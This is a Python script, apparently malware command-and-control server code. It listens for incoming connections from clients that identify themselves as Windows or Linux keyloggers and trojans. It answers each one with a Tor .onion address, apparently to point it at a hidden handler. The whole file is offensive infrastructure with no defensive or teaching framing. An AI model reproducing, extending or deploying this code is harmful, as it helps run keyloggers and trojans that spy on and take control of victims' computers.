#listen for the incomming connections and show the online clients

from base64 import decode
import socket
from _thread import *


def start_new_handler(connection_):
    Input = b'newonioncircuitfromhandler.onion'
    try:
        connection_.send(Input)
    except socket.error as e:
        print("inside handler")
        print(str(e))
        print("error while sending url\n")


def start_new_sock_thread(connection):
    try:
        from_client_recv = connection.recv(2048)
        from_client_data = from_client_recv.decode("utf-8")
        print("from_client -> ", from_client_data)
        if from_client_data == "WIN-KYG":
            print ("Windows Keylogger client connected...")
            Input = "lajhljghlasjgjngsakjhurhtuhg.onion"
            connection.send(str.encode(Input))
            connection.close()
        elif from_client_data == "WIN-TRG":
            print ("Windows trogen client connected...")
            Input = "lajhljghlasjgjngsakjhurhtuhg.onion"
            connection.send(str.encode(Input))
            connection.close()
        elif from_client_data == "LIN-KYG":
            print ("Linux keylogger client connected...")
            Input = "lajhljghlasjgjngsakjhurhtuhg.onion"
            connection.send(str.encode(Input))
            connection.close()
        elif from_client_data == "LIN-TRG":
            print ("Linux trogen client connected...\n")
            print ("calling handler...\n")
            try:
                start_new_thread(start_new_handler, (connection, ))
            except socket.error as e:
                print("inside listner")
                print(str(e))
            print("handler executed...\n")
            connection.close()
        else:
            print("client connection closed at server end...")
            connection.close()
    except socket.error as e:
        print (str(e))
    finally:
        connection.close()

def client_listener():
    HOST_IP = "127.0.0.1"
    HOST_PORT = 7070
    ThreadCount = 0
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((HOST_IP, HOST_PORT))
        except socket.error as sock_error:
            print(str(sock_error))
        s.listen(100)
        while True:
            conn, addr = s.accept()
            print("Connected to : " + addr[0] + ":" ,str(addr[1]))
            start_new_thread(start_new_sock_thread, (conn, ))
            ThreadCount += 1
            print('Thread Number: ' + str(ThreadCount))
def main():

    client_listener()

if __name__ == '__main__':
    main()
